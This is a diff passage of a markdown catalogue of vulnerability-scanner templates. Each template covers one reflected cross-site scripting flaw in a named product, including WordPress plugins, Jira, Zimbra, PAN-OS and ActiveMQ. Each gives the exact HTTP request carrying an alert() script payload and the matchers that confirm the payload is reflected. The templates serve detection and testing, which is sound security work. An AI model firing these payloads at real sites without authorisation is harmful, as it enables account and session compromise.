-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5646,7 +5646,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5672,7 +5672,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5685,7 +5685,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# WordPress MW Font Changer <=4.2.5 - Cross-Site Scripting
+# WordPress MW Font Changer \<=4.2.5 - Cross-Site Scripting
 ## Description
 - WordPress MW Font Changer plugin 4.2.5 and before contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -5698,7 +5698,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -5711,7 +5711,7 @@ Referer: xss"/><img src="#" onerror="alert(document.domain)"/>
     1. 200
 
 ---
-# DomainMOD <=4.11.01 - Cross-Site Scripting
+# DomainMOD \<=4.11.01 - Cross-Site Scripting
 ## Description
 - DomainMOD through version 4.11.01 is vulnerable to cross-site scripting via the assets/edit/host.php Web Host Name or Web Host URL field.
 
@@ -5748,11 +5748,11 @@ Host: {{Hostname}}
 - dsl
     1. status_code_3 == 200
     2. contains(all_headers_3, "text/html")
-    3. contains(body_3, "><script>alert(document.domain)</script></a>")
+    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
 - condition - and
 
 ---
-# WordPress Ninja Forms <3.3.18 - Cross-Site Scripting
+# WordPress Ninja Forms \<3.3.18 - Cross-Site Scripting
 ## Description
 - WordPress Ninja Forms plugin before 3.3.18 contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in includes/Admin/Menus/Submissions.php via the begin_date, end_date, or form_id parameters. This can allow an attacker to steal cookie-based authentication credentials and launch other attacks.
 
@@ -5770,7 +5770,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In
 ```
 ### Step - 2
 ```
-GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1
+GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date=">\<img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -5779,7 +5779,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body_2
 - words
-    1. Begin Date" value="\"><img src=x onerror=alert(document.domain);//">
+    1. Begin Date" value="\">\<img src=x onerror=alert(document.domain);//">
 
 **Type - word**
 - part - header_2
@@ -5804,7 +5804,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -5832,8 +5832,8 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <svg/onload=alert(1337)>
-    2. <script>alert(1337)</script>
+    1. \<svg/onload=alert(1337)>
+    2. \<script>alert(1337)\</script>
 - condition - or
 
 **Type - word**
@@ -5847,7 +5847,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Atlassian Jira WallboardServlet <7.13.1 - Cross-Site Scripting
+# Atlassian Jira WallboardServlet \<7.13.1 - Cross-Site Scripting
 ## Description
 - The WallboardServlet resource in Jira before version 7.13.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross-site scripting vulnerability in the cyclePeriod parameter.
 - severity - medium
@@ -5877,13 +5877,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/plus/feedback.php/rp4hu%27><script>alert%28document.domain%29<%2fscript>?aid=3
+- {{BaseURL}}/plus/feedback.php/rp4hu%27>\<script>alert%28document.domain%29\<%2fscript>?aid=3
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. '><script>alert(document.domain)</script>
+    1. '>\<script>alert(document.domain)\</script>
     2. DedeCMS Error Warning!
 - condition - and
 
@@ -5914,7 +5914,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. "><script>alert(/{{randstr}}/);</script>
+    1. ">\<script>alert(/{{randstr}}/);\</script>
 - part - body
 
 **Type - word**
@@ -5931,12 +5931,12 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow></TITLE></HEAD><body><script>alert(1337)</script><!--&>helpFile=concepts.html
+- {{BaseURL}}/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow>\</TITLE>\</HEAD>\<body>\<script>alert(1337)\</script>\<!--&>helpFile=concepts.html
 ### Matchers
 
 **Type - word**
 - words
-    1. <script>alert(1337)</script><!--</TITLE>
+    1. \<script>alert(1337)\</script>\<!--\</TITLE>
 - part - body
 
 ---
@@ -5977,7 +5977,7 @@ Host: {{Hostname}}
 - dsl
     1. status_code_3 == 200
     2. contains(all_headers_3, "text/html")
-    3. contains(body_3, "><script>alert(document.domain)</script></a>")
+    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
 - condition - and
 
 ---
@@ -6000,7 +6000,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <iframe src="javascript:alert(document.domain)">
+    1. \<iframe src="javascript:alert(document.domain)">
     2. confluence
 - condition - and
 
@@ -6024,7 +6024,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. &"/><script>alert(1)</script>=&"><< Back</a><br><br>
+    1. &"/>\<script>alert(1)\</script>=&">\<\< Back\</a>\<br>\<br>
 
 **Type - word**
 - part - header
@@ -6049,7 +6049,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -6062,7 +6062,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Adiscon LogAnalyzer <4.1.7 - Cross-Site Scripting
+# Adiscon LogAnalyzer \<4.1.7 - Cross-Site Scripting
 ## Description
 - Adiscon LogAnalyzer before 4.1.7 contains a cross-site scripting vulnerability in the 'referer' parameter of the login.php file.
 
@@ -6077,7 +6077,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. value=""><script>confirm(document.domain)</script>
+    1. value="">\<script>confirm(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -6116,7 +6116,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>&really_del
+    1. \<script>alert(document.domain)\</script>&really_del
 
 **Type - word**
 - part - header
@@ -6165,11 +6165,11 @@ Host: {{Hostname}}
 - dsl
     1. status_code_3 == 200
     2. contains(all_headers_3, "text/html")
-    3. contains(body_3, "><script>alert(document.domain)</script></a>")
+    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
 - condition - and
 
 ---
-# WordPress wpForo Forum <= 1.4.11 - Cross-Site Scripting
+# WordPress wpForo Forum \<= 1.4.11 - Cross-Site Scripting
 ## Description
 - WordPress wpForo Forum plugin before 1.4.12 for WordPress allows unauthenticated reflected cross-site scripting via the URI.
 - severity - medium
@@ -6182,7 +6182,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -6195,7 +6195,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Synacor Zimbra Collaboration Suite Collaboration <8.8.11 - Cross-Site Scripting
+# Synacor Zimbra Collaboration Suite Collaboration \<8.8.11 - Cross-Site Scripting
 ## Description
 - Synacor Zimbra Collaboration Suite Collaboration before 8.8.11 is vulnerable to cross-site scripting via the AJAX and html web clients.
 - severity - medium
@@ -6208,7 +6208,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -6257,7 +6257,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script></a>
+    1. ">\<script>alert(document.domain)\</script>\</a>
 
 **Type - word**
 - part - header
@@ -6306,7 +6306,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. <script>alert(1)</script></a>
+    1. \<script>alert(1)\</script>\</a>
 
 **Type - word**
 - part - header
@@ -6354,7 +6354,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script></a>
+    1. ">\<script>alert(document.domain)\</script>\</a>
 
 **Type - word**
 - part - header
@@ -6366,7 +6366,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Zend Server <9.13 - Cross-Site Scripting
+# Zend Server \<9.13 - Cross-Site Scripting
 ## Description
 - Zend Server before version 9.13 is vulnerable to cross-site scripting via the debug_host parameter.
 
@@ -6381,7 +6381,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
     2. is not allowed to open debug sessions
 - condition - and
 
@@ -6409,7 +6409,7 @@ Host: {{BaseURL}}
 ```
 ### Step - 2
 ```
-GET /cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
+GET /cs/Satellite?destpage="\<h1xxx">\<script>alert(document.domain)\</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
 Host: {{BaseURL}}
 
 ```
@@ -6418,12 +6418,12 @@ Host: {{BaseURL}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif
+    1. \<script>alert(document.domain)\</script>/graphics/common/screen/dotclear.gif
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(24)</script>
+    1. \<script>alert(24)\</script>
     2. Missing translation key
 - condition - and
 
@@ -6465,7 +6465,7 @@ Host: {{Hostname}}
 - dsl
     1. status_code_3 == 200
     2. contains(all_headers_3, "text/html")
-    3. contains(body_3, '><script>alert(document.domain)</script></a>')
+    3. contains(body_3, '>\<script>alert(document.domain)\</script>\</a>')
 - condition - and
 
 ---
@@ -6496,7 +6496,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script>&really_del=1">YES
+    1. ">\<script>alert(document.domain)\</script>&really_del=1">YES
 
 **Type - word**
 - part - header
@@ -6525,7 +6525,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <a href="javascript:alert(document.domain)//
+    1. \<a href="javascript:alert(document.domain)//
 
 ---
 # WordPress sitepress-multilingual-cms 3.6.3 - Cross-Site Scripting
@@ -6538,7 +6538,7 @@ Host: {{Hostname}}
 - Method - POST
 ### URL
 - {{BaseURL}}/wp-admin/admin.php
-  - icl_post_action=save_theme_localization&locale_file_name_en=EN"><script>alert(0);</script>
+  - icl_post_action=save_theme_localization&locale_file_name_en=EN">\<script>alert(0);\</script>
 
 ### Matchers
 
@@ -6546,11 +6546,11 @@ Host: {{Hostname}}
 - dsl
     1. contains(tolower(all_headers), "text/html")
     2. contains(set_cookie, "_icl_current_admin_language")
-    3. contains(body, "\"><script>alert(0);</script>")
+    3. contains(body, "\">\<script>alert(0);\</script>")
 - condition - and
 
 ---
-# WordPress SagePay Server Gateway for WooCommerce <1.0.9 - Cross-Site Scripting
+# WordPress SagePay Server Gateway for WooCommerce \<1.0.9 - Cross-Site Scripting
 ## Description
 - WordPress SagePay Server Gateway for WooCommerce before 1.0.9 is vulnerable to cross-site scripting via the includes/pages/redirect.php page parameter.
 - severity - medium
@@ -6563,7 +6563,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -6576,7 +6576,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Dolibarr <7.0.2 - Cross-Site Scripting
+# Dolibarr \<7.0.2 - Cross-Site Scripting
 ## Description
 - Dolibarr before 7.0.2  is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via the foruserlogin parameter to adherents/cartes/carte.php.
 
@@ -6590,7 +6590,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -6640,11 +6640,11 @@ Host: {{Hostname}}
 - dsl
     1. status_code_3 == 200
     2. contains(all_headers_3, "text/html")
-    3. contains(body_3, "><script>alert(document.domain)</script></a>")
+    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
 - condition - and
 
 ---
-# Planon <Live Build 41 - Cross-Site Scripting
+# Planon \<Live Build 41 - Cross-Site Scripting
 ## Description
 - Planon before Live Build 41 is vulnerable to cross-site scripting.
 - severity - medium
@@ -6661,7 +6661,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -6670,7 +6670,7 @@ Host: {{Hostname}}
 - part - header
 
 ---
-# WordPress JSmol2WP <=1.07 - Cross-Site Scripting
+# WordPress JSmol2WP \<=1.07 - Cross-Site Scripting
 ## Description
 - WordPress JSmol2WP version 1.07 and earlier is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via the jsmol.php data parameter.
 - severity - medium
@@ -6683,7 +6683,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -6696,7 +6696,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Apache ActiveMQ <=5.15.5 - Cross-Site Scripting
+# Apache ActiveMQ \<=5.15.5 - Cross-Site Scripting
 ## Description
 - Apache ActiveMQ versions 5.0.0 to 5.15.5 are vulnerable to cross-site scripting via the web based administration console on the queue.jsp page. The root cause of this issue is improper data filtering of the QueueFilter parameter.
 - severity - medium
@@ -6709,7 +6709,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. "><script>alert("1")</script>
+    1. ">\<script>alert("1")\</script>
 
 **Type - word**
 - words
@@ -6729,7 +6729,7 @@ Host: {{Hostname}}
 ## Requests
 ### Step - 1
 ```
-GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(document.domain)</script> HTTP/1.1
+GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq">\<script>alert(document.domain)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -6750,12 +6750,12 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif
+    1. \<script>alert(document.domain)\</script>/graphics/common/screen/dotclear.gif
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. Variables.cs_imagedir
 - condition - and
 
@@ -6769,14 +6769,14 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/api/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
-- {{BaseURL}}/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
+- {{BaseURL}}/api/jolokia/read\<svg%20onload=alert(document.domain)>?mimeType=text/html
+- {{BaseURL}}/jolokia/read\<svg%20onload=alert(document.domain)>?mimeType=text/html
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <svg onload=alert(document.domain)>
+    1. \<svg onload=alert(document.domain)>
     2. java.lang.IllegalArgumentException
     3. No type with name
 - condition - and
@@ -6791,7 +6791,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Palo Alto Networks PAN-OS GlobalProtect <8.1.4 - Cross-Site Scripting
+# Palo Alto Networks PAN-OS GlobalProtect \<8.1.4 - Cross-Site Scripting
 ## Description
 - Palo Alto Networks PAN-OS before 8.1.4 GlobalProtect Portal Login page allows an unauthenticated attacker to inject arbitrary JavaScript or HTML, making it vulnerable to cross-site scripting.
 - severity - medium
@@ -6853,7 +6853,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain)</script></a>
+    1. ">\<script>alert(document.domain)\</script>\</a>
 
 **Type - word**
 - part - header
@@ -6865,7 +6865,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Grav CMS <1.3.0 - Cross-Site Scripting
+# Grav CMS \<1.3.0 - Cross-Site Scripting
 ## Description
 - Grav CMS before 1.3.0 is vulnerable to cross-site scripting via system/src/Grav/Common/Twig/Twig.php and allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO to admin/tools.
 
@@ -6879,7 +6879,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -6929,7 +6929,7 @@ Host: {{Hostname}}
 - dsl
     1. status_code_3 == 200
     2. contains(all_headers_3, "text/html")
-    3. contains(body_3, "><script>alert(document.domain)</script></a>")
+    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
 - condition - and
 
 ---
@@ -6942,13 +6942,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/bibliopac/bin/wxis.exe/bibliopac/?IsisScript=bibliopac/bin/bibliopac.xic&db="><script>prompt(document.domain)</script>
+- {{BaseURL}}/bibliopac/bin/wxis.exe/bibliopac/?IsisScript=bibliopac/bin/bibliopac.xic&db=">\<script>prompt(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. "><script>prompt(document.domain)</script>.xrf
+    1. ">\<script>prompt(document.domain)\</script>.xrf
 
 **Type - word**
 - part - header
@@ -6972,14 +6972,14 @@ POST / HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")</script>b7g0x=1
+username=admin&password=admin&_submit_check=1&jlbqg\<script>alert("{{randstr}}")\</script>b7g0x=1
 
 ```
 ### Matchers
 
 **Type - word**
 - words
-    1. <script>alert("{{randstr}}")</script>
+    1. \<script>alert("{{randstr}}")\</script>
     2. AvantFAX
 - part - body
 - condition - and
@@ -7008,7 +7008,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
 
 **Type - word**
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -7039,7 +7039,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
 **Type - word**
 - part - body
 - words
-    1. "><script>alert(document.domain);</script><
+    1. ">\<script>alert(document.domain);\</script>\<
 
 **Type - word**
 - part - header
@@ -7060,7 +7060,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7073,7 +7073,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
     1. 200
 
 ---
-# WordPress Raygun4WP <=1.8.0 - Cross-Site Scripting
+# WordPress Raygun4WP \<=1.8.0 - Cross-Site Scripting
 ## Description
 - WordPress Raygun4WP 1.8.0 contains a reflected cross-site scripting vulnerability via sendtesterror.php.
 - severity - medium
@@ -7086,7 +7086,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7099,7 +7099,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
     1. 200
 
 ---
-# FineCMS <=5.0.10 - Cross-Site Scripting
+# FineCMS \<=5.0.10 - Cross-Site Scripting
 ## Description
 - FineCMS through 5.0.10 contains a cross-site scripting vulnerability in controllers/api.php via the function parameter in a c=api&m=data2 request.
 
@@ -7114,7 +7114,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>p不存在
+    1. \<script>alert(document.domain)\</script>p不存在
 
 **Type - word**
 - part - header
@@ -7126,7 +7126,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
     1. 200
 
 ---
-# WordPress Stop User Enumeration <=1.3.7 - Cross-Site Scripting
+# WordPress Stop User Enumeration \<=1.3.7 - Cross-Site Scripting
 ## Description
 - WordPress Stop User Enumeration 1.3.7 and earlier are vulnerable to unauthenticated reflected cross-site scripting.
 - severity - medium
@@ -7139,7 +7139,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7209,7 +7209,7 @@ username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")<
 ## Requests
 ### Step - 1
 ```
-GET /webadmin/pkg?command=<script>alert(document.cookie)</script> HTTP/1.1
+GET /webadmin/pkg?command=\<script>alert(document.cookie)\</script> HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -7218,7 +7218,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. Unknown command: <script>alert(document.cookie)</script>
+    1. Unknown command: \<script>alert(document.cookie)\</script>
 
 ---
 # KMCIS CaseAware - Cross-Site Scripting
@@ -7235,7 +7235,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. '></script><script>alert(document.domain)</script>
+    1. '>\</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -7255,13 +7255,13 @@ Content-Type: application/x-www-form-urlencoded
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/dokuwiki/doku.php?id=wiki:welcome&at=<svg%20onload=alert(document.domain)>
+- {{BaseURL}}/dokuwiki/doku.php?id=wiki:welcome&at=\<svg%20onload=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. Unable to parse at parameter "<svg onload=alert(document.domain)>".</div>
+    1. Unable to parse at parameter "\<svg onload=alert(document.domain)>".\</div>
 
 **Type - word**
 - part - header
@@ -7286,7 +7286,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. <img src=x onerror=alert(document.domain)>
+    1. \<img src=x onerror=alert(document.domain)>
     2. Failed to add new collection
 - part - body
 - condition - and
@@ -7312,7 +7312,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7347,7 +7347,7 @@ Content-Type: application/x-www-form-urlencoded
 - condition - and
 
 ---
-# WordPress Mailster <=1.5.4 - Cross-Site Scripting
+# WordPress Mailster \<=1.5.4 - Cross-Site Scripting
 ## Description
 - WordPress Mailster 1.5.4 and before contains a cross-site scripting vulnerability in the unsubscribe handler via the mes parameter to view/subscription/unsubscribe2.php.
 - severity - medium
@@ -7360,7 +7360,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7382,14 +7382,14 @@ Content-Type: application/x-www-form-urlencoded
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>&dSecurityGroup=&QueryText=(dInDate+>=+%60<$dateCurrent(-7)$>%60)&PageTitle=OO
-- {{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>
+- {{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX\<svg/onload=alert(document.domain)>&dSecurityGroup=&QueryText=(dInDate+>=+%60\<$dateCurrent(-7)$>%60)&PageTitle=OO
+- {{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX\<svg/onload=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <svg/onload=alert(document.domain)>
+    1. \<svg/onload=alert(document.domain)>
     2. ORACLE_QUERY
 - condition - and
 
@@ -7439,7 +7439,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -7451,7 +7451,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Ultimate Weather Plugin <= 1.0 - Cross-Site Scripting
+# Ultimate Weather Plugin \<= 1.0 - Cross-Site Scripting
 ## Description
 - The ultimate-weather plugin 1.0 for WordPress contains a cross-site scripting vulnerability.
 - severity - medium
@@ -7464,7 +7464,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7491,7 +7491,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -7503,7 +7503,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Import Legacy Media <= 0.1 - Cross-Site Scripting
+# Import Legacy Media \<= 0.1 - Cross-Site Scripting
 ## Description
 - A cross-site scripting vulnerability in the Import Legacy Media plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
 - severity - medium
@@ -7516,7 +7516,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. '></script><script>alert(document.domain)</script>
+    1. '>\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7529,7 +7529,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Podcast Channels < 0.28 - Cross-Site Scripting
+# Podcast Channels \< 0.28 - Cross-Site Scripting
 ## Description
 - The Podcast Channels WordPress plugin was affected by an unauthenticated reflected cross-site scripting security vulnerability.
 - severity - medium
@@ -7542,7 +7542,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -7555,7 +7555,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Shortcode Ninja <= 1.4 - Cross-Site Scripting
+# Shortcode Ninja \<= 1.4 - Cross-Site Scripting
 ## Description
